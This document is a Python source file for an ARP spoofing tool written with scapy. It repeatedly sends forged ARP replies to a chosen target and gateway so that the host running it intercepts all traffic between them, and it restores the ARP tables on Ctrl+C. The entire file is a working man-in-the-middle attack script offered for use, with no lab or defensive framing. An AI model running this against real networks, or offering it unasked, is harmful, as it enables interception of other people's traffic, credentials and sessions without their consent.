#!bin/user/env python

r"""  >>>   python arp_spoofer.py -t 'target ip' -g 'gateway/spoofed ip'   <<< 
    This script spoofs the ARP table of the target and the gateway IP. The device on which this script is runs becoms the "MAN-IN-THE-MIDDLE" device between the target and the gateway device. All the request and response packets sent between the target and the gateway passes through the host device on which code is running.
    The modules imported in this script are >>>
    - scapy : This module is used here to get the MAC address of the IP address passed by broadcasting ARP request in the entire network.
    - argparse : This module gets the arguments passed with the script in the command shell and parse the information from them.
    - time : This module is used to keep track of time.
    - sys : This module is used for buffer flushing.
"""

import scapy.all as scapy
import argparse
import time
import sys

def get_cmd_args():
    r""" This funciton gets the arguments passed with script on the command shell and returns the info parsed.
         The arguments passed are >>>
         * -t or --target : Target IP
         * -g or --gateway : Gateway IP
    :return: A variable having keys -
             * (variable_name).target : Target IP
             * (variable_name).gateway : Gateway IP
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Targt IP")
    parser.add_argument("-g","--gateway",dest="gateway",help="Gateway IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP. For more details use -h or --help.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway IP. For more details use -h or --help.")
    return options

def get_mac(ip):
    r""" This function returns the MAC address of the IP passed.
    :param ip: IP address whose MAC address to be found.
    :return: MAC address of the IP passed.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast , timeout = 1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip,target_mac):
    r""" This function poisons the ARP table of the target IP and spoofs the spoof IP with our MAC address.
    :param target_ip: Target IP
    :param spoof_ip: Spoofing IP
    :return: NONE
    """
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def print_sent_packets(target,gateway):
    r""" This function prints the number of packets sent.
    :param target: Target IP.
    :param gateway: Gateway IP.
    :return: NONE
    """
    sent_packets_count = 0
    target1_mac = get_mac(target)
    target2_mac = get_mac(gateway)
    while True:
        spoof(target, gateway,target1_mac)
        spoof(gateway, target,target2_mac)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent : " + str(sent_packets_count) + " "),
        sys.stdout.flush()
        time.sleep(2)


def restore(destination_ip,source_ip):
    r""" This function restores the ARP table of the destination IP.
    :param destination_ip: Destination IP whose ARP table to be restored.
    :param source_ip: Source IP.
    :return:
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)




options = get_cmd_args()
try:
    print_sent_packets(options.target,options.gateway)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C ..... Restoring ARP tables.... Please Wait .....")
    restore(options.target,options.gateway)
    restore(options.gateway,options.target)
    print("[+] ARP tables restored. Quiting !!!")
